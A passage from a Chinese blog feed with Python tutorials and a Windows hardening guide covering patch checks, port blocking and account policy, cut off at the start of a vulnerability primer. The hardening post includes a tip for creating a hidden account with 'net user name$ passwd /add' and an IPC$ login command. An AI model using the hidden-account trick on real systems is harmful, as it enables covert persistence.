&lt;= month &lt;= 12</p><p>day：指定的日期，1 &lt;= day &lt;= 月份所对应的日期上限</p><p>hour：指定的小时，0 &lt;= hour &lt; 24</p><p>minute：指定的分钟数，0 &lt;= minute &lt; 60</p><p>second：指定的秒数，0 &lt;= second &lt; 60</p><p>microsecond：指定的微秒数，0 &lt;= microsecond &lt; 1000000</p><p>其中，hour、minute、second、microsecond参数可以全部或部分省略</p><p>调用datetime()函数直接创建一个datetime对象，表示2021年2月10日17:47,32秒7微秒，执行结果如下：</p><pre><code class="python">&gt;&gt;&gt; someday = datetime(2021,2,10,17,47,32,7)&gt;&gt;&gt; somedaydatetime.datetime(2021, 2, 10, 17, 47, 32, 7)</code></pre><p>（2）当程序有了一个datetime对象，就可以进一步利用这个对象的属性显示时间，为了区别datetime库名，采用上例中的someday代替生成的datetime对象。常见属性如下表所示。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">someday.min</td><td align="center">固定返回datetime的最小时间对象，datetime(1,1,1,0,0)</td></tr><tr><td align="center">someday.max</td><td align="center">固定返回datetime的最大时间对象，datetime(9999,12,31,23,59,59,999999)</td></tr><tr><td align="center">someday.year</td><td align="center">返回someday包含的年份</td></tr><tr><td align="center">someday.month</td><td align="center">返回someday包含的月份</td></tr><tr><td align="center">someday.day</td><td align="center">返回someday包含的日期</td></tr><tr><td align="center">someday.hour</td><td align="center">返回someday包含的小时</td></tr><tr><td align="center">someday.minute</td><td align="center">返回someday包含的分钟</td></tr><tr><td align="center">someday.second</td><td align="center">返回someday包含的秒钟</td></tr><tr><td align="center">someday.microsecond</td><td align="center">返回someday包含的微妙值</td></tr></tbody></table><p>（3）datetime对象有3个常用的时间格式化方法，如下表所示。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">someday.isoformat()</td><td align="center">采用ISO 8601标准显示时间</td></tr><tr><td align="center">someday.isoweekday()</td><td align="center">根据日期计算星期后返回1到7，对应星期一到星期日</td></tr><tr><td align="center">someday.strftime()</td><td align="center">根据格式化字符串format进行格式显示的方法</td></tr></tbody></table><ul><li>isoformat() 和isoweekday() 方法的使用如下：</li></ul><pre><code class="python">&gt;&gt;&gt; someday = datetime(2021,2,10,17,47,32,7)&gt;&gt;&gt; someday.isoformat()&#39;2021-02-10T17:47:32.000007&#39;&gt;&gt;&gt; someday.isoweekday()3</code></pre></li><li><p>strftime()方法是时间格式化最有效的方法，几乎可以以任何通用格式输出时间。例如：</p><pre><code class="python">&gt;&gt;&gt; someday.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)&#39;2021-02-10 17:47:32&#39;</code></pre></li><li><p>下表给出了strftime()方法的格式化控制符。</p></li></ul><table><thead><tr><th align="center">格式化字符串</th><th align="center">日期/时间</th><th align="center">值范围和实例</th></tr></thead><tbody><tr><td align="center">%Y</td><td align="center">年份</td><td align="center">0001~9999，例如：1900</td></tr><tr><td align="center">%m</td><td align="center">月份</td><td align="center">01~12，例如：10</td></tr><tr><td align="center">%B</td><td align="center">月名</td><td align="center">January~December，例如：April</td></tr><tr><td align="center">%b</td><td align="center">月名缩写</td><td align="center">Jan~Dec，例如：Apr</td></tr><tr><td align="center">%d</td><td align="center">日期</td><td align="center">01~31，例如：25</td></tr><tr><td align="center">%A</td><td align="center">星期</td><td align="center">Monday~Sunday，例如：Wednesday</td></tr><tr><td align="center">%a</td><td align="center">星期缩写</td><td align="center">Mon~Sun，例如：Wed</td></tr><tr><td align="center">%H</td><td align="center">小时(24h制)</td><td align="center">00~23，例如：12</td></tr><tr><td align="center">%I</td><td align="center">小时(12h制)</td><td align="center">12<del>12/1</del>12，例如：06</td></tr><tr><td align="center">%M</td><td align="center">分钟</td><td align="center">00~59，例如：26</td></tr><tr><td align="center">%S</td><td align="center">秒钟</td><td align="center">00~59，例如：26</td></tr><tr><td align="center">%x</td><td align="center">日期</td><td align="center">月/日/年，例如：02/10/2021</td></tr><tr><td align="center">%X</td><td align="center">时间</td><td align="center">时:分:秒，例如：18:22:08</td></tr><tr><td align="center">%p</td><td align="center">上午和下午两个时段</td><td align="center">AM/PM</td></tr></tbody></table><ul><li><p>strftime()格式化字符串的数字左侧会自动补零，上述格式也可以与print()的格式化函数一起使用，例如：</p><pre><code class="python">&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; now =datetime.now()&gt;&gt;&gt; now.strftime(&quot;%Y-%m-%d&quot;)&#39;2021-02-10&#39;&gt;&gt;&gt; now.strftime(&quot;%A, %d. %B %Y %I:%M%p&quot;)&#39;Wednesday, 10. February 2021 06:24PM&#39;&gt;&gt;&gt; print(&quot;今天是&#123;0:%Y&#125;年&#123;0:%m&#125;月&#123;0:%d&#125;日&quot;.format(now))今天是2021年02月10日</code></pre></li></ul><h2 id="实例：七段数码管绘制"><a href="#实例：七段数码管绘制" class="headerlink" title="实例：七段数码管绘制"></a>实例：七段数码管绘制</h2><p><strong>用于理解函数及其封装的价值</strong></p><p>（1）七段数码管由7段数码管拼接而成，每段有亮或不亮两种情况，改进型的七段数码管还包括一个小数点的位置。七段数码管能形成pow(2,7)=128种不同状态，其中部分状态能够显示易于人们理解的数字或字母含义，因此被广泛使用。</p><p>（2）通过turtle库函数绘制七段数码管形式的日期信息。该问题的IPO描述如下：</p><ul><li>输入：当前日期的数字形式</li><li>处理：根据每个数字绘制七段数码管表示</li><li>输出：绘制当前日期的七段数码管表示</li></ul><p>（3）每个0到9的数字都有相同的七段数码管样式，因此可以通过设计函数复用数字的绘制过程。此外，每个七段数码管包括7个数码管样式，除了数码位置不同外，绘制风格一致，也可以通过函数复用单个数码端的绘制过程。程序的全部代码如下：</p><pre><code class="python">import turtle, datetimedef drawLine(draw):         #绘制单段数码管    turtle.pendown() if draw else turtle.penup()    turtle.fd(40)    turtle.right(90)        #画笔指针顺时针旋转90度def drawDigit(d):           #根据数字绘制七段数码管    drawLine(True) if d in [2,3,4,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,1,3,4,5,6,7,8,9] else drawLine(False)    drawLine(True) if d in [0,2,3,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,2,6,8] else drawLine(False)    turtle.left(90)         #画笔指针逆时针旋转90度    drawLine(True) if d in [0,4,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,2,3,5,6,7,8,9] else drawLine(False)    drawLine(True) if d in [0,1,2,3,4,7,8,9] else drawLine(False)    turtle.left(180)    turtle.penup()    turtle.fd(20)def drawDate(date):          #获得要输出的数字    for i in date:        drawDigit(eval(i))   #通过eval()函数将数字变为整数def main():    turtle.setup(800,350,200,200) #设置窗口大小    turtle.penup()    turtle.fd(-300)               #后退300    turtle.pensize(5)             #设置画笔宽度    drawDate(datetime.datetime.now().strftime(&#39;%Y%m%d&#39;))  #设置格式化后的系统时间    turtle.hideturtle()     #隐藏乌龟main()</code></pre><p><img src="https://i.loli.net/2021/02/10/YcpEnA9ae7mkbdM.png" alt="image-20210210185913020"></p><p>（4）实例代码中定义了drawDigit()函数，该函数根据输入的数字d绘制七段数码管。每个数码管的绘制顺序如下图所示。</p><p><img src="https://i.loli.net/2021/02/10/3sCFkVX5Uv6dIEo.png" alt="image-20210210190032681"></p><p>（5）绘制起点在数码管中部左侧，无论每段数码管是否会被绘制出来，turtle画笔都会按顺序画完7个数码管。对于给定的数字d，那个数码段会被绘制出来采用if-else语句判断。</p><pre><code class="python">drawLine(True) if d in [2,3,4,5,6,8,9] else drawLine(False)</code></pre><p>（6）上面一行代码根据输入数字判断是否要绘制七段数码管最中间的横线，当需要绘制时，调用绘制函数drawLine()，参数赋值True；当不需要绘制时，参数赋值False。根据0~9数字结构，对于2,3,4,5,6,8,9这些数字需要绘制，否则不需要绘制。</p><p>（7）为了使输出样式固定，简化设计，当不需要绘制时，turtle画笔需要抬起。drawLine()函数根据输出参数的值(True或False)决定是否抬起画笔。</p><p>（8）为了使代码模块化更好，实例中定义了drawDate()函数和main()函数。</p><ul><li>其中drawDate()函数将更长数字分解为单个数字，进一步调用drawDigit()分别绘制每个数字。</li><li>main()函数将启动窗体大小、设置画笔宽度、设置系统时间等功能封装在一起，但main()函数并不体现单一功能，这种封装仅从提高代码可读性角度考虑。</li></ul><p>（9）2.0版本</p><pre><code class="python">import turtle, datetimedef drawGap():              #绘制数码管间隔    turtle.penup()    turtle.fd(5)def drawLine(draw):         #绘制单段数码管    drawGap()    turtle.pendown() if draw else turtle.penup()    turtle.fd(40)    drawGap()    turtle.right(90)def drawDigit(d):           #根据数字绘制七段数码管    drawLine(True) if d in [2,3,4,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,1,3,4,5,6,7,8,9] else drawLine(False)    drawLine(True) if d in [0,2,3,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,2,6,8] else drawLine(False)    turtle.left(90)    drawLine(True) if d in [0,4,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,2,3,5,6,7,8,9] else drawLine(False)    drawLine(True) if d in [0,1,2,3,4,7,8,9] else drawLine(False)    turtle.left(180)    turtle.penup()    turtle.fd(20)def drawDate(date):          #获得要输出的数字    turtle.pencolor(&quot;red&quot;)    for i in date:        if i == &#39;-&#39;:            turtle.write(&#39;年&#39;,font=(&quot;Arial&quot;,18,&quot;normal&quot;))            turtle.pencolor(&quot;green&quot;)            turtle.fd(40)        elif i == &#39;=&#39;:            turtle.write(&#39;月&#39;,font=(&quot;Arial&quot;,18,&quot;normal&quot;))            turtle.pencolor(&quot;blue&quot;)            turtle.fd(40)        elif i == &#39;+&#39;:            turtle.write(&#39;日&#39;,font=(&quot;Arial&quot;,18,&quot;normal&quot;))        else:            drawDigit(eval(i))def main():    turtle.setup(800,350,200,200)    turtle.penup()    turtle.fd(-350)    turtle.pensize(5)    drawDate(datetime.datetime.now().strftime(&#39;%Y%m%d&#39;))    turtle.hideturtle()main()</code></pre><p><img src="https://i.loli.net/2021/02/10/WA3NPQFU1VbdJ5H.png" alt="image-20210210195715369"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(四)</title>
      <link href="2020/12/13/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8402/"/>
      <url>2020/12/13/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8402/</url>
      
        <content type="html"><![CDATA[<h2 id="random库的使用"><a href="#random库的使用" class="headerlink" title="random库的使用"></a>random库的使用</h2><p><strong>要点：随机运算的标准函数库random共提供9个常用函数</strong></p><h3 id="random库描述"><a href="#random库描述" class="headerlink" title="random库描述"></a>random库描述</h3><p>Python内置的random库主要用于产生各种分布的伪随机数序列。random采用梅森旋转算法生成伪随机数序列。主要目的是生成随机数，所有函数都是基于最基本的random.random()函数扩展实现。</p><h3 id="random库解析"><a href="#random库解析" class="headerlink" title="random库解析"></a>random库解析</h3><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">seed(a=None)</td><td align="center">初始化随机数种子，默认值为当前系统时间</td></tr><tr><td align="center">random()</td><td align="center">生成一个[0.0, 1.0]之间的随机小数</td></tr><tr><td align="center">randint(a, b)</td><td align="center">生成一个[a,  b]之间的整数</td></tr><tr><td align="center">getrandbits(k)</td><td align="center">生成一个k比特长度的随机整数</td></tr><tr><td align="center">randrange(start, stop[, step])</td><td align="center">生成一个[start, stop]之间以step为步数的随机整数</td></tr><tr><td align="center">uniform(a, b)</td><td align="center">生成一个[a, b]之间的随机小数</td></tr><tr><td align="center">choice(seq)</td><td align="center">从序列类型，例如列表中随机返回一个元素</td></tr><tr><td align="center">shuffle(seq)</td><td align="center">将序列类型中的元素随机排列，返回打乱后的序列</td></tr><tr><td align="center">sample(pop, k)</td><td align="center">从pop类型中随机选取k个元素，以列表类型返回</td></tr></tbody></table><p>（1）random库的引用方法与math库一样，可以采用下面两种方式实现：</p><p>import random 或 from random import *</p><pre><code class="python">&gt;&gt;&gt; from random import *&gt;&gt;&gt; randrange(0, 100, 4)  #从0开始到100以4递增的元素中随机返回20&gt;&gt;&gt; choice(range(100))82&gt;&gt;&gt; list(range(10))[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]&gt;&gt;&gt; ls = list(range(10))&gt;&gt;&gt; shuffle(ls)&gt;&gt;&gt; print(ls)[3, 5, 8, 7, 9, 0, 1, 2, 6, 4]</code></pre><p>（2）生成随机数之前可以通过seed()函数指定随机数种子，随机数种子一般是一个整数，只要种子相同，每次生成的随机数序列也相同。</p><pre><code class="Python">seed(125)  #随机数种子赋值为125&gt;&gt;&gt; print(&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;.format(randint(1, 10),randint(1, 10),randint(1, 10)))&#39;4.4.10&#39;&gt;&gt;&gt; print(&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;.format(randint(1, 10),randint(1, 10),randint(1, 10)))&#39;5.10.3&#39;&gt;&gt;&gt; seed(125)   #再次给随机数种子赋值125&gt;&gt;&gt; print(&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;.format(randint(1, 10),randint(1, 10),randint(1, 10)))&#39;4.4.10&#39;</code></pre><p>（3）从上述语句可发现，在设定相同种子后，每次调用随机函数生成的随机数是相同的。这是随机数种子的作用。</p><h2 id="程序的异常处理"><a href="#程序的异常处理" class="headerlink" title="程序的异常处理"></a>程序的异常处理</h2><p><strong>要点：Python通过try、except等保留字提供异常处理功能</strong></p><pre><code class="python">num = eval(input(&quot;请输入一个数字：&quot;))print(num**2)</code></pre><p>（1）输入数字时，程序正常执行，若输入数字则会报错。</p><pre><code class="python">请输入一个数字：10010000&gt;&gt;&gt; 请输入一个数字：abcTraceback (most recent call last):  File &quot;&lt;pyshell#2&gt;&quot;, line 1, in &lt;module&gt;      #line1为异常发生的代码行数    num = eval(input(&quot;请输入一个数字：&quot;))  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;NameError: name &#39;abc&#39; is not defined           #NameError为异常类型，后面跟异常内容提示&gt;&gt;&gt; </code></pre><h3 id="异常处理：try-except语句"><a href="#异常处理：try-except语句" class="headerlink" title="异常处理：try-except语句"></a>异常处理：try-except语句</h3><p>（1）Python使用try-except语句实现异常处理，其基本语法格式如下：</p><pre><code class="python">try:    &lt;语句块1&gt;except &lt;异常类型&gt;:    &lt;语句块2&gt;</code></pre><p>语句块1是正常执行的内容，当发生异常时执行except保留字后面的语句块。例如：</p><pre><code class="python">try:    num = eval(input(&quot;请输入一个数字：&quot;))    print(num**2)except NameError:    print(&quot;输入错误，请输入一个整数。&quot;)</code></pre><p>执行结果：</p><pre><code class="python">请输入一个数字：abc输入错误，请输入一个整数。&gt;&gt;&gt; </code></pre><h3 id="异常的高级用法"><a href="#异常的高级用法" class="headerlink" title="异常的高级用法"></a>异常的高级用法</h3><p>（1)try-except语句可以支持多个except语句，语法格式如下：</p><pre><code class="python">try:    &lt;语句块1&gt;except &lt;异常类型1&gt;:    &lt;语句块2&gt;...except &lt;异常类型N&gt;:    &lt;语句块N+1&gt;except:    &lt;语句块N+2&gt;</code></pre><p>（2）其中，第1到第N个except语句后面都指定了异常类型，说明这些except所包含的语句块只处理这些类型的异常。最后一个except语句没有指定任何类型，表示它对应的语句块可以处理所有其他异常。这个过程与if-elif-else语句类似，是分支结构的一种表达方式。例如：</p><pre><code class="python">try:    alp = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    idx = eval(input(&quot;请输入一个整数：&quot;))    print(alp[idx])except NameError:    print(&quot;输入错误，请输入一个整数!&quot;)except:    print(&quot;其他错误&quot;)</code></pre><p>（3）上面的程序中，当用户输入非整数字符时，except NameError 异常被捕获到，提示用户输入类型错误，当用户输入数字不再0到25之间时，异常被except捕获，程序打印其错误。执行结果如下：</p><pre><code class="python">&gt;&gt;&gt;请输入一个整数：abc输入错误，请输入一个整数!&gt;&gt;&gt;请输入一个整数：100其他错误</code></pre><p>（4）除了try和except保留字外，异常语句还可以和else和finally保留字配合使用，语法格式如下：</p><pre><code class="python">try:    &lt;语句块1&gt;except &lt;异常类型1&gt;:    &lt;语句块2&gt;else:    &lt;语句块3&gt;finally:    &lt;语句块4&gt;</code></pre><p>（5）else语句与循环中的else一样，当try中的语句块1正常执行结束且没有发生异常时，else中的语句块3执行，可以看作是对try语句块正常执行后的一种追加处理。若except捕获到异常，则不会执行else中的语句块3。</p><p>finally语句块则不同，无论try中的语句块1是否发生异常，语句块4都会执行。因此，可以将程序执行语句块1的一些收尾工作放在这里，例如：关闭、打开文件等。</p><pre><code class="python">try:    alp = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    idx = eval(input(&quot;请输入一个整数：&quot;))    print(alp[idx])except NameError:    print(&quot;输入错误，请输入一个整数!&quot;)except:    print(&quot;其他错误&quot;)else:    print(&quot;没有发生异常&quot;)finally:    print(&quot;程序执行完毕，不知道是否发生了异常&quot;)</code></pre><p>执行结果：</p><pre><code class="python">&gt;&gt;&gt;请输入一个整数：6G没有发生异常程序执行完毕，不知道是否发生了异常&gt;&gt;&gt; 请输入一个整数：abc输入错误，请输入一个整数!程序执行完毕，不知道是否发生了异常</code></pre><p>（6）try-except异常一般只用来检测极少发生的情况，编写程序时不应过度依赖try-except这种异常处理机制，应该尽量在程序中采用if语句直接判断，避免通过异常处理来应对可能发生的情况。因为采用try-except语句会影响代码的可读性，增加代码维护难度。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows系统安全加固</title>
      <link href="2020/12/10/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
      <url>2020/12/10/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="安全加固基本思路"><a href="#安全加固基本思路" class="headerlink" title="安全加固基本思路"></a>安全加固基本思路</h2><h3 id="安全基线"><a href="#安全基线" class="headerlink" title="安全基线"></a>安全基线</h3><p>（1）安全基线，即系统必须达到的最低的安全标准</p><p>（2）一般通过检查各安全配置参数是否符合标准来度量</p><h3 id="系统信息审查"><a href="#系统信息审查" class="headerlink" title="系统信息审查"></a>系统信息审查</h3><p>（1）查看系统的详细版本号，使用命令：</p><pre><code>ver 或者 winver</code></pre><p><img src="https://i.loli.net/2020/12/10/FMeLBRwpbI5d6WK.png" alt="image-20201210163842045"></p><p><img src="https://i.loli.net/2020/12/10/dnkx2zrlBDy5Obp.png" alt="image-20201210164309222"></p><p>（2）查看系统的服务补丁包(Service Pack)，1个SP版本包含了该系统一段时间系统补丁和服务更新的集合。</p><pre><code>wmic os get ServicePackMajorVersion</code></pre><p><img src="https://i.loli.net/2020/12/10/RMjFdkwe2aWpHsL.png" alt="image-20201210164333299"></p><p>（3）查看系统的补丁安装情况</p><pre><code>wmic qfe get hotfixid,InstalledOn</code></pre><p><img src="https://i.loli.net/2020/12/10/uaWThg9wYXoiRlc.png" alt="image-20201210164603798"></p><p>（4）查看主机名</p><pre><code>hostname</code></pre><p><img src="https://i.loli.net/2020/12/10/XAxzg9RNInQ86pi.png" alt="image-20201210164905930"></p><p>（5）查看系统信息，包括主机信息，注册ID，处理器，内存，BIOS，域，补丁，网卡等信息。</p><pre><code>systeminfo</code></pre><p><img src="https://i.loli.net/2020/12/10/5gmDzh12qQBv8tI.png" alt="image-20201210165140544"></p><p>（6）查看开放端口</p><pre><code>netstat -anonetstat -ano | find &quot;445&quot;     //端口筛选</code></pre><p><img src="https://i.loli.net/2020/12/10/ocea9lZtJTN5hIE.png" alt="image-20201210165941323"></p><p><img src="https://i.loli.net/2020/12/10/F4EUNLO9hQyi7fj.png" alt="image-20201210170028656"></p><p>（7）查看路由表，查看网络配置</p><pre><code>route printipconfig/all</code></pre><p><img src="https://i.loli.net/2020/12/10/HKiMeIPbUjcOXA2.png" alt="image-20201210170259177"></p><p><img src="https://i.loli.net/2020/12/10/ix2Xm8wFtZouLjv.png" alt="image-20201210170356121"></p><h2 id="Windows系统安全漏洞的修复"><a href="#Windows系统安全漏洞的修复" class="headerlink" title="Windows系统安全漏洞的修复"></a>Windows系统安全漏洞的修复</h2><h3 id="漏洞修复——方法1-补丁安装"><a href="#漏洞修复——方法1-补丁安装" class="headerlink" title="漏洞修复——方法1.补丁安装"></a>漏洞修复——方法1.补丁安装</h3><p>（1)补丁安装属于永久解决方案</p><p>（2）微软官方补丁管理，官网补丁下载地址:<a href="http://www.catalog.update.microsoft.com/home.aspx">http://www.catalog.update.microsoft.com/home.aspx</a></p><p><img src="https://i.loli.net/2020/12/10/Wd5ceJPw6niLkza.png" alt="image-20201210171059715"></p><p><img src="https://i.loli.net/2020/12/10/IoaNf5WcJEZ4Gyd.png" alt="image-20201210171120240"></p><h4 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h4><p><strong>以Windows7 SP1安装ms12-020漏洞补丁KB2621440为例</strong></p><p>（1）微软安全公告</p><p>（2）下载并安装补丁</p><p>（3）查看补丁安装情况</p><pre><code>wmic qfe get hotfixid,InstalledOn | find /i &quot;KB2621440&quot;</code></pre><p>（4）Metasploit验证无漏洞</p><h3 id="漏洞修复——方法2-端口封禁"><a href="#漏洞修复——方法2-端口封禁" class="headerlink" title="漏洞修复——方法2.端口封禁"></a>漏洞修复——方法2.端口封禁</h3><p>（1）端口封禁是漏洞修复的临时解决方法</p><p>（2）端口能被利用，是因为漏洞所在服务依赖端口开放访问，如果将端口封禁，那么漏洞便无法成功利用。封禁并不是把端口关掉，而是把访问该端口的流量过滤。例：</p><p>ms17-010漏洞所在服务是文件共享服务smb，依赖端口为135,139,445</p><p>ms12-020漏洞所在服务是远程桌面服务RDP，依赖端口为3389</p><p>ms15-034漏洞所在服务是超文本传输协议http，依赖端口为80</p><p>（3）端口封禁的方法：在组策略中创建IP安全策略。</p><h4 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h4><p><strong>封禁135端口对外开放</strong></p><p>（1）运行gpedit.msc进入组策略配置(组策略:是针对用户upn或计算机上强制使用的配置方法，不是权限)</p><pre><code>PS:家庭版的Windows没有组策略，以管理员身份运行下载的脚本后，再用运行窗口即可打开gpedit.msc</code></pre><p>（2）依次点击进入计算机配置–&gt;Windows设置–&gt;安全设置–&gt;IP安全策略</p><p>（3）在空白处右键，创建IP安全策略</p><p>（4）进入IP安全策略设置向导</p><p>（5）设置IP安全策略名称</p><p>（6）去除”激活默认响应规则”</p><p>（7）点击完成， 并进入编辑属性</p><p>（8）去除”使用添加向导”复选框，点击”添加”进入IP筛选列表配置</p><p>（9）去除”使用添加向导”复选框，点击”添加”进入IP筛选器配置</p><p>（10）地址选项卡，源地址选择”任何地址”，目标地址选择”我的IP地址”，去掉”镜像”</p><p>（11）协议选项卡，协议类型选择”TCP”,设置从任意端口，到此端口填写135，点击”确定”，若需要添加屏蔽端口，可再次点击添加，无需添加则点击”确定”</p><p>（12）在筛选器操作选项卡，点击”添加”，添加一个新筛选器操作”阻止”</p><p>（13）选中新建的IP筛选列表和筛选器操作，点击”应用”</p><p>（14）右键新IP安全策略，点击”分配”，指派新建的IP安全策略</p><pre><code>运行--&gt;gpupdate /force    ##强制更新</code></pre><p>（15）在kali中使用nmap工具验证端口已被阻塞</p><pre><code>nmap -sS -p 135,139,445,3389 192.168.14.131</code></pre><h2 id="Windows系统配置加固"><a href="#Windows系统配置加固" class="headerlink" title="Windows系统配置加固"></a>Windows系统配置加固</h2><h4 id="账号口令"><a href="#账号口令" class="headerlink" title="账号口令"></a>账号口令</h4><p><strong>账号优化:目的是为了梳理系统中的账号以及口令，避免默认账号及弱口令的存在</strong></p><p>（1）查看账号方式：</p><pre><code>开始--&gt;运行--&gt;compmgmt.msc(进入计算机管理)/lusrmgr.msc--&gt;本地用户和组或者开始--&gt;运行--&gt;cmd--&gt;net user</code></pre><p><img src="https://i.loli.net/2020/12/10/KSJmdz6aosPxeNM.png" alt="image-20201210185315326"></p><p>（2）删除无用账号</p><pre><code>net user user_name /delPS:net user user_name$ passwd /add  增加一个账号，其中的添加美元符号即可在命令行中隐藏net user /?  获取提示</code></pre><p>（3）锁定无用账号，如锁定”Guest”账号</p><pre><code>net user Guest /active:no</code></pre><p>（4）禁用Guest账号：运行–&gt;lusrmgr.msc–&gt;用户–&gt;Guest–&gt;禁用</p><p><strong>口令策略：增强密码复杂度，防止用户长期使用同一个账号，以及账号锁定策略等，降低系统账号被暴力破解的可能性</strong></p><p>（1）配置方式：开始–&gt;运行–&gt;secpol.msc(本地安全策略)–&gt;安全设置</p><p>（2）账户策略–&gt;密码策略(建议加固值)</p><p>（3）账户策略–&gt;账户锁定策略(建议加固值)</p><p>（4）本地策略–&gt;安全选项：配置用户退出后再次登录不会显示上次退出的用户名</p><h4 id="授权管理"><a href="#授权管理" class="headerlink" title="授权管理"></a>授权管理</h4><p>（1）授权账号登录：目的是设置允许从本地或者远程登录的账号。</p><p>（2）配置操作：开始–&gt;运行–&gt;secpol.msc–&gt;安全设置–&gt;本地策略–&gt;用户权限分配</p><p>（3）要求系统账号无法远程登录：用户权限分配–&gt;拒绝通过远程桌面服务登录–&gt;添加用户和组，添加system和administrator。</p><p><img src="https://i.loli.net/2020/12/13/ipIALnbZvF1JOxB.png" alt="image-20201213111329893"></p><p><img src="https://i.loli.net/2020/12/13/SekzPwMoQpaC9AF.png" alt="image-20201213111112396"></p><p><img src="https://i.loli.net/2020/12/13/P459tnRrvLBY1FV.png" alt="image-20201213110908484"></p><p>拒绝从网络访问这台计算机–&gt;添加用户和组，添加system和administrator</p><p><img src="https://i.loli.net/2020/12/13/TEGv8lBVZSO1aoI.png" alt="image-20201213110947814"></p><p>（4）最后要强制生效组策略，运行窗口下执行</p><pre><code>gpupdate /force</code></pre><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>利用cmd将Windows物理机的文件传输到Windows虚拟机。</p><pre><code>net use \\192.168.14.131\ipc$ &quot;ndsec&quot; user:ndsec       ##其中ndsec为虚拟机的账户密码，192.168.14.131为虚拟机的IP地址</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统漏洞分析与验证</title>
      <link href="2020/12/06/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%AA%8C%E8%AF%81/"/>
      <url>2020/12/06/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h2 id="安全漏洞的基本概念"><a href="#安全漏洞的基本概念" class="headerlink" title="安全漏洞的基本概念"></a>安全漏洞的基本概念</h2><h3 id="漏洞的定义"><a href="#漏洞的定义" class="headerlink" title="漏洞的定义"></a>漏洞的定义</h3><p>（1）漏洞(Vulnerability)是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。简单说就是指一个系统存在的弱点或缺陷。</p><p>（2）1970-80年代，早期黑客的出现和第一个计算机病毒的产生，软件漏洞逐渐引起人们的注意。</p><p>（3）计算机病毒(Computer Virus)是编制者在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组计算机指令或者程序代码。</p><h3 id="漏洞的成因"><a href="#漏洞的成因" class="headerlink" title="漏洞的成因"></a>漏洞的成因</h3><p>（1）实现漏洞：是安全漏洞中最大的一类。实现漏洞是由于在程序编码时不够严谨或对于安全性的考虑不周而产生的漏洞，缓冲区溢出类漏洞就是最典型的实现漏洞。</p><p>（2）设计漏洞：主要是指软件、硬件和固件在设计时对于安全性考虑不周而导致的漏洞。</p><p>例如F5 BIG-ip远程绕过验证漏洞是由于F5设备的SSH登录模块内置了一个可用于登录的密钥文件，这个密钥被泄露后任意获取该密钥的用户都可以登录一台相关版本的设备。</p><p>（3）配置漏洞：是由于软件的默认配置或者不恰当的配置导致的安全漏洞。</p><p>例如弱口令或默认口令就是一种常见的配置漏洞。</p><h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><p>（1)微软的RPC漏洞与蠕虫病毒</p><table><thead><tr><th align="center">时间</th><th align="center">漏洞</th><th align="center">危害</th></tr></thead><tbody><tr><td align="center">2003年</td><td align="center">RPC(远程过程调用协议)接口中的缓冲区溢出   冲击波蠕虫病毒</td><td align="center">席卷全球80%的计算机</td></tr><tr><td align="center">2008年</td><td align="center">MS08-067漏洞，基于445端口(共享打印机/文件)   Conficker(飞客蠕虫病毒)</td><td align="center">感染1500万台以上计算机</td></tr><tr><td align="center">2017年</td><td align="center">永恒之蓝(MS17-010)漏洞，基于445端口  Wannacry(勒索病毒)</td><td align="center">造成80亿美元以上经济损失</td></tr></tbody></table><p>（2）漏洞的危害：远程控制、信息泄露、拒绝服务、权限提升</p><h3 id="漏洞的信息组成"><a href="#漏洞的信息组成" 